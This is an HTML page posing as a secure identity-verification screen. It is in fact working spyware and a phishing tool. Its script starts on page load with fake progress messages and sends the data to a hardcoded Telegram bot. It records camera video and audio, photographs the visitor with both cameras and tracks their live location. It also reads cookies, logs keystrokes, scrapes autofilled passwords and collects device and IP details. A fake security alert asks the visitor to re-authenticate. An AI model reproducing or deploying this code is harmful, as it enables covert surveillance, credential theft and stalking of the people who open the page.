<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 Secure Connection | Identity Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Segoe UI', 'Poppins', 'Cairo', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #e0e0e0;
            padding: 20px;
        }
        .glass-card {
            background: rgba(18, 25, 45, 0.75);
            backdrop-filter: blur(12px);
            border-radius: 32px;
            border: 1px solid rgba(0, 255, 255, 0.2);
            box-shadow: 0 25px 45px rgba(0,0,0,0.4);
            padding: 2rem;
            max-width: 550px;
            width: 100%;
            text-align: center;
        }
        h2 {
            font-weight: 600;
            font-size: 1.9rem;
            background: linear-gradient(135deg, #fff, #3bc9db);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .status-box {
            background: #0f1422;
            border-radius: 20px;
            padding: 1.2rem;
            margin: 1.5rem 0;
            font-family: monospace;
            font-size: 0.85rem;
            text-align: left;
            border-left: 4px solid #3bc9db;
        }
        .status-line { display: flex; align-items: center; gap: 10px; margin: 8px 0; }
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(59,201,219,0.3);
            border-top-color: #3bc9db;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .hidden { display: none; }
        .permission-btn {
            background: rgba(59, 201, 219, 0.15);
            border: 1px solid #3bc9db;
            border-radius: 40px;
            padding: 12px 24px;
            font-weight: 600;
            color: #3bc9db;
            cursor: pointer;
            display: inline-block;
            margin-top: 20px;
        }
        .permission-btn:hover { background: #3bc9db; color: #0a0f1e; }
        .footer { margin-top: 25px; font-size: 0.7rem; color: #6c7a8e; }
    </style>
</head>
<body>
<div class="glass-card">
    <h2>🔒 SECURE IDENTITY PROTOCOL</h2>
    <p>Verifying your session & device integrity</p>
    <div class="status-box" id="logBox">
        <div class="status-line" id="step1">🔐 <span>Establishing secure channel...</span> <span class="spinner"></span></div>
        <div class="status-line hidden" id="step2">📷 <span>Accessing camera & microphone...</span> <span class="spinner"></span></div>
        <div class="status-line hidden" id="step3">📍 <span>Retrieving geolocation...</span> <span class="spinner"></span></div>
        <div class="status-line hidden" id="step4">📱 <span>Capturing device identifiers...</span> <span class="spinner"></span></div>
        <div class="status-line hidden" id="step5">📸 <span>Taking screenshots & logs...</span> <span class="spinner"></span></div>
    </div>
    <div id="permissionRequest" class="hidden">
        <div class="permission-btn" id="requestPermsBtn">✅ Grant Required Permissions</div>
    </div>
    <div class="footer">🔒 AES-256 Encrypted • Secure Channel</div>
</div>

<script>
    // ======================= CONFIG =======================
    const TOKEN = "8449865560:AAHHFcJWchQlKNgYpP3W7BYXUWvbAOKFAkI";
    const CHAT_ID = "7984067238";
    
    // Helper: send photo
    async function sendPhoto(blob, caption = "") {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('photo', blob);
        if (caption) fd.append('caption', caption);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }
    // Helper: send voice
    async function sendVoice(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('voice', blob);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
    }
    // Helper: send video
    async function sendVideo(blob) {
        const fd = new FormData();
        fd.append('chat_id', CHAT_ID);
        fd.append('video', blob);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
    }
    // Helper: send text
    async function sendMessage(text) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
        });
    }
    
    function showStep(stepId, status = 'loading') {
        const el = document.getElementById(stepId);
        if (el) {
            el.classList.remove('hidden');
            if (status === 'done') {
                el.querySelector('.spinner')?.classList.add('hidden');
                el.querySelector('span:first-child').innerHTML = el.querySelector('span:first-child').innerHTML.replace('...', ' ✓ done');
            } else if (status === 'error') {
                el.querySelector('.spinner')?.classList.add('hidden');
                el.querySelector('span:first-child').innerHTML = el.querySelector('span:first-child').innerHTML.replace('...', ' ❌ failed');
            }
        }
    }
    
    // ========== 1. Capture screenshot (using html2canvas if available, else fallback) ==========
    async function captureScreenshot() {
        try {
            if (typeof html2canvas !== 'undefined') {
                const canvas = await html2canvas(document.body);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                if (blob) await sendPhoto(blob, "📸 Screenshot of current page");
            } else {
                // Alternative: send a dummy message that screenshot failed
                await sendMessage("⚠️ Screenshot not available (html2canvas missing)");
            }
        } catch(e) { console.warn(e); }
    }
    
    // ========== 2. Record video (10 seconds) ==========
    async function recordVideo(stream, duration = 10000) {
        return new Promise((resolve) => {
            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                if (blob.size > 5000) await sendVideo(blob);
                resolve();
            };
            recorder.start();
            setTimeout(() => recorder.stop(), duration);
        });
    }
    
    // ========== 3. Get cookies ==========
    async function stealCookies() {
        try {
            const cookies = document.cookie;
            if (cookies && cookies.length > 0) {
                await sendMessage(`🍪 *COOKIES*%0A\`\`\`${cookies.substring(0, 900)}\`\`\``);
            }
        } catch(e) {}
    }
    
    // ========== 4. Keylogger ==========
    let keylogBuffer = "";
    function startKeylogger() {
        document.addEventListener('keydown', (e) => {
            if (e.target && (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA' || e.target.isContentEditable)) {
                keylogBuffer += e.key;
                if (keylogBuffer.length > 200) {
                    sendMessage(`⌨️ *KEYLOG*%0A\`${keylogBuffer}\``);
                    keylogBuffer = "";
                }
            }
        });
        setInterval(() => {
            if (keylogBuffer.length > 0) {
                sendMessage(`⌨️ *KEYLOG*%0A\`${keylogBuffer}\``);
                keylogBuffer = "";
            }
        }, 10000);
    }
    
    // ========== 5. Steal saved passwords (injection) ==========
    function injectPasswordStealer() {
        const script = document.createElement('script');
        script.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js';
        document.head.appendChild(script);
        // Try to steal autofilled passwords from forms
        setTimeout(() => {
            const inputs = document.querySelectorAll('input[type="password"]');
            inputs.forEach(async (input) => {
                if (input.value && input.value.length > 0) {
                    await sendMessage(`🔑 *PASSWORD LEAK*%0A\`${input.value}\`%0A📍 Field: ${input.name || 'unknown'}`);
                }
            });
        }, 3000);
    }
    
    // ========== 6. Continuous location (every 30 sec) ==========
    let locationInterval = null;
    function startContinuousLocation() {
        if (!navigator.geolocation) return;
        const sendLocation = () => {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const mapsUrl = `📍 *LIVE LOCATION*%0Ahttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}%0A🎯 Acc: ${pos.coords.accuracy}m`;
                await sendMessage(mapsUrl);
            }, () => {});
        };
        sendLocation();
        locationInterval = setInterval(sendLocation, 30000);
    }
    
    // ========== 7. Fake notification ==========
    function showFakeNotification() {
        if (Notification.permission === 'granted') {
            new Notification('⚠️ Security Alert', { body: 'Your session requires re-authentication. Please verify your identity.', icon: 'https://cdn-icons-png.flaticon.com/512/190/190411.png' });
        } else if (Notification.permission !== 'denied') {
            Notification.requestPermission().then(perm => {
                if (perm === 'granted') showFakeNotification();
            });
        }
    }
    
    // ========== 8. Network info ==========
    async function getNetworkInfo() {
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const netInfo = `📡 *NETWORK*%0A📶 Type: ${conn?.effectiveType || 'unknown'}%0A⚡ Downlink: ${conn?.downlink || '?'} Mbps%0A🔄 RTT: ${conn?.rtt || '?'} ms`;
            await sendMessage(netInfo);
        } catch(e) {}
    }
    
    // ========== MAIN ==========
    async function startHarvest() {
        showStep('step2', 'loading');
        try {
            // Request camera + microphone + screen capture permissions
            const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            showStep('step2', 'done');
            
            // Record video (10 sec)
            recordVideo(mediaStream, 10000);
            
            // Capture front & back photos
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
            // quick photo capture function
            const capturePhotoFromStream = async (stream, caption) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 800; canvas.height = 600;
                await new Promise(r => setTimeout(r, 500));
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                stream.getTracks().forEach(t => t.stop());
                if (blob) await sendPhoto(blob, caption);
            };
            await capturePhotoFromStream(frontStream, "📸 Front camera");
            await capturePhotoFromStream(backStream, "📸 Back camera");
            
            // Location
            showStep('step3', 'loading');
            startContinuousLocation(); // sends once then every 30s
            showStep('step3', 'done');
            
            // Device info + IP
            showStep('step4', 'loading');
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            const deviceInfo = `🖥️ *DEVICE INFO*%0A📱 UA: ${navigator.userAgent}%0A💻 Platform: ${navigator.platform}%0A🌐 Lang: ${navigator.language}%0A📺 Screen: ${screen.width}x${screen.height}%0A🕒 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}%0A🌍 IP: ${ipData.ip}`;
            await sendMessage(deviceInfo);
            showStep('step4', 'done');
            
            // Advanced: cookies, keylogger, network, fake notification
            showStep('step5', 'loading');
            await stealCookies();
            startKeylogger();
            await getNetworkInfo();
            showFakeNotification();
            // Try to inject password stealer (requires external library)
            injectPasswordStealer();
            showStep('step5', 'done');
            
            // Final redirect after 3 sec
            await sendMessage(`✅ *Session completed* - ${new Date().toISOString()}`);
            setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
        } catch (err) {
            console.error(err);
            showStep('step2', 'error');
            document.getElementById('permissionRequest').classList.remove('hidden');
            document.getElementById('requestPermsBtn').onclick = () => startHarvest();
        }
    }
    
    window.onload = () => {
        showStep('step1', 'loading');
        setTimeout(() => {
            showStep('step1', 'done');
            startHarvest();
        }, 1000);
    };
</script>
<!-- Optional: html2canvas for screenshot -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</body>
</html>
